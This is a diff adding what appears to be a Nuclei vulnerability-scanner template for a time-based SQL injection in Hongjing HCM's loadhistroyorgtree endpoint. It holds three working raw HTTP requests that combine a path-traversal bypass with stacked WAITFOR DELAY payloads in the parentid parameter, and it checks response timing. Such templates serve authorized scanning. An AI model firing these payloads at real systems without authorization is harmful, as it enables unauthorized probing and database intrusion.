@@ -1,0 +1,46 @@
+id: hjsoft-hcm-loadhistroyorgtree-sqli
+
+info:
+  name: 宏景hcm loadhistroyorgtree SQL注入
+  author: SleepingBag945
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A0%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+      - |
+        GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A2%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+      - |
+        GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=0  && duration_1<=2"
+          - "duration_2>=2  && duration_2<=4"
+          - "duration_3>=4  && duration_3<=6"
